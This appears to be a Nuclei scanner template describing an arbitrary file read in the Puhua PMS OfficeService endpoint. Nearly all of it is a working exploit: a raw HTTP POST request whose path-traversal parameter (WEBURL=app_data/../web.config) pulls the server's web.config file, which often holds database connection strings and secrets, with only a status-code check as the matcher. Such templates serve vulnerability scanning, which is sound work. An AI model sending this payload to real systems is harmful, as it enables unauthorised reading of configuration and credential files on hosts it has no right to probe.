id: poc-vhnexdnbb0nuz3eg
info:
  name: 普华PMS OfficeService存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: lfi,2025
http:
- raw:
  - 'POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Accept-Language: zh-CN,zh;q=0.9

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

    Content-Type: application/x-www-form-urlencoded

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate


    action=download&WEBURL=app_data/../web.config'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
